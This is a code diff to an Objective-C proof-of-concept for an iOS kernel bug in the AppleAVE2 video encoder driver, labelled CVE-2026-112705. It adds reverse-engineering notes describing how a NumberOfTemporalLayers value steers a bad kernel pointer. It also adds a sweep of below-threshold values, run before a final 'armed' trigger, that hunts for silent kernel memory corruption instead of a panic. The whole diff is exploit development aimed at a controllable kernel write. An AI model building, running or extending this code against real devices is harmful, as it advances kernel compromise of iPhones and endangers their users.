@@ -136,25 +136,40 @@
     NSMutableString *report = [NSMutableString string];
     [report appendString:@"=== KexProofV4 · CVE-2026-112705 · AppleAVE2 NTL ===\n"];
     [report appendString:@"Public PoC: MchinaMd57764/AVETemporalPoC (independent repro of Calif/Chollima).\n"];
-    [report appendString:@"Trigger: VTCompressionSessionCreate ok -> NumberOfTemporalLayers=16463\n"];
-    [report appendString:@"         -> FIRST encode -> Kernel data abort in AppleAVE2+0xDA78.\n"];
-    [report appendString:@"Threshold: 16462 survives, 16463 panics (on iPhone18,1; ours is iPhone16,1).\n"];
-    [report appendString:@"Fingerprint: far=0x59, x19=0x1 (16464 -> 0x100000059/0x100000001), videocodecd.\n"];
-    [report appendString:@"No RCMode is set: RCMode=20 returned -12900 on this SoC and blocked earlier runs.\n"];
-    [report appendString:@"WARNING: the armed encode may panic the kernel and reboot the device.\n"];
+    [report appendString:@"RE (confirmed on-device panic + kext disasm): crash = stp x0,x0,[x0]\n"];
+    [report appendString:@"  (list-head init) at AppleAVE2 __TEXT_EXEC+0xDA78 with x0 = BAD POINTER.\n"];
+    [report appendString:@"  Pointer law: x0 = ((NTL-16463) << 32) | 0x59,  x19 = ((NTL-16463) << 32) | 1.\n"];
+    [report appendString:@"  16463 -> 0x59 (panic); 16464 -> 0x100000059; NTL<16463 steers the high\n"];
+    [report appendString:@"  32 bits NEGATIVE (e.g. 16447 -> index 0xfffffff0 -> 0xfffffff000000059,\n"];
+    [report appendString:@"  a canonical kernel range). If the pointer lands on mapped kernel memory,\n"];
+    [report appendString:@"  the store SILENTLY writes the pointer there (+0x18 zeroed) = corruption.\n"];
+    [report appendString:@"Trigger: VTCompressionSessionCreate ok -> NumberOfTemporalLayers=N ->\n"];
+    [report appendString:@"         FIRST encode. No RCMode (RCMode=20 fails -12900 on this SoC).\n"];
+    [report appendString:@"WARNING: armed encodes may panic the kernel and reboot the device.\n"];
     [report appendFormat:@"Target: iOS %@ uid=%d\n", UIDevice.currentDevice.systemVersion, getuid()];
+
+    if (self.ntl >= 16463) {
+        // Steer values FIRST — the armed NTL at the end reboots the device.
+        [report appendString:@"\nSTEER SWEEP (below-threshold NTL values — silent corruption watch):\n"];
+        for (NSNumber *n in @[@16462, @16455, @16447, @16431, @0, @(-1)]) {
+            int saved = self.ntl;
+            self.ntl = n.intValue;
+            [report appendFormat:@"\n--- steer NTL=%d ---\n%@\n", n.intValue, [self runTrigger]];
+            self.ntl = saved;
+        }
+        [report appendString:@"\n--- final armed trigger (device may reboot here) ---\n"];
+    }
     [report appendFormat:@"\n%@\n", [self runTrigger]];
 
     [report appendString:@"\nVERDICT: "];
     [report appendString:self.ntl >= 16463 ? @"SEE_STATUS_FIELD\n" : @"SEE_STATUS_FIELD (control)\n"];
     [report appendString:
-     @"status=SURVIVED with ntl=16463 means the first encode did NOT panic on this\n"
-     @"device/build — either the threshold differs on T8130 or the encode never\n"
-     @"reached the driver (check encode_status / journal). status=SESSION_CREATE_\n"
-     @"FAILED means VideoToolbox refused the session entirely.\n"
-     @"A panic = the journal's BEFORE_ENCODE[0] line is the last record, and the\n"
-     @"device panic log (Kernel data abort, AppleAVE2) is the proof — pull it\n"
-     @"after reboot via the crash audit.\n"];
+     @"Reading the sweep: status=SURVIVED at NTL<16463 means the computed pointer\n"
+     @"landed somewhere MAPPED and the list-init store fired silently — that is a\n"
+     @"kernel memory corruption without a panic, and the interesting case.\n"
+     @"A panic with a NEW far value proves the pointer is steered by NTL.\n"
+     @"status=SURVIVED everywhere = encodes never reached the driver (check\n"
+     @"encode_status / journal lines per variant).\n"];
     return report;
 }
 
